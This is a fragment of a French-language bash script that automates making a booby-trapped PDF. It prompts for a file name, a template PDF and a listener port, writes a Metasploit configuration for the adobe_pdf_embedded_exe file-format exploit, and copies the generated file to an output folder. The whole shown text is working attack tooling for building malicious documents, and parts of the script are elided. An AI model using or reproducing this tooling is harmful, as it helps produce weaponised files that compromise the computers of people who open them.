...
echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le nom à donner au fichier piégé (NOM.pdf) : $DEFAULT"
read nameTemplate

template=$(zenity --title "Lien vers le template" --filename=$path --file-selection --text "Choisissez le template à utiliser.") > /dev/null 2>&1

echo -e -n "
$MAGENTA [>]$DEFAULT$CYAN Entrez le port à utiliser (réutiliser ce port lors de l'ouverture du listener) (4444) : $DEFAULT"
read port
...
echo -e "
$BLUE [...]$DEFAULT$CYAN Création du fichier de configuration du payload (format pdf)... $DEFAULT
"

echo "use exploit/windows/fileformat/adobe_pdf_embedded_exe
...
cp /root/.msf4/local/$nameTemplate $path/../../output/
sleep 0.5
